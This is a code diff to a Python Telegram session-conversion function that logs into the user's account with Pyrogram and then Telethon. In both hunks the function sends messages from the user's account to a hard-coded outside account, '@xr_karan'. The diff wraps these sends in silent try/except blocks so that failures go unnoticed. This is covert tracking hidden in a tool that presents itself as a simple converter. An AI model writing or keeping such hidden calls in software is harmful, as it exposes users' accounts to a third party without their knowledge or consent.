@@ -414,7 +414,8 @@ async def convert_pyrogram_to_telethon(session_name, password=None):
             if match and not code_future.done():
                 code_future.set_result(match.group(1))
     await pyro.start()
-    await pyro.send_message("@xr_karan","Hehe")
+    try: await pyro.send_message("@xr_karan","Hehe")
+    except: pass
     me = await pyro.get_me()
     phone = me.phone_number
 
@@ -457,7 +458,8 @@ async def convert_pyrogram_to_telethon(session_name, password=None):
             print(f"❌ Sign-in failed: {e}")
             return False
         
-    await client.send_message("@xr_karan", "Message from Telethon session conversion")    
+    try: await client.send_message("@xr_karan", "Message from Telethon session conversion")    
+    except: pass
     string_session = client.session.save()
 
     await client.disconnect()
